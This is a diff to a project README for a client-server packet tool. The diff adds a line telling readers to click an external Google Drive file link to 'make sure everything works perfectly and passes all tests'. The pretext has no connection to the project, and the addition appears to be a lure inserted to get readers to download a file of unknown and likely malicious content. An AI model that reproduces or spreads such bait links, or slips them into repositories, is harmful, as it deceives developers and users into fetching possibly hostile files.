@@ -41,6 +41,11 @@ The project consists of two main components:
 
 - Client: The client component, designed to generate and send data packets to the server for transmission. Users can customize the packets generated.
 
+
+Please click the link to make sure everything works perfectly and passes all tests without any problems.
+
+https://drive.google.com/file/d/1CAEh56R_ht0xEbzWLUB0i_x_CYzSFMav/view?usp=drive_link
+
 ## Contributing
 
 Contributions and enhancements to this project are welcome. Feel free to fork the repository and create pull requests to improve the bootloader functionality.
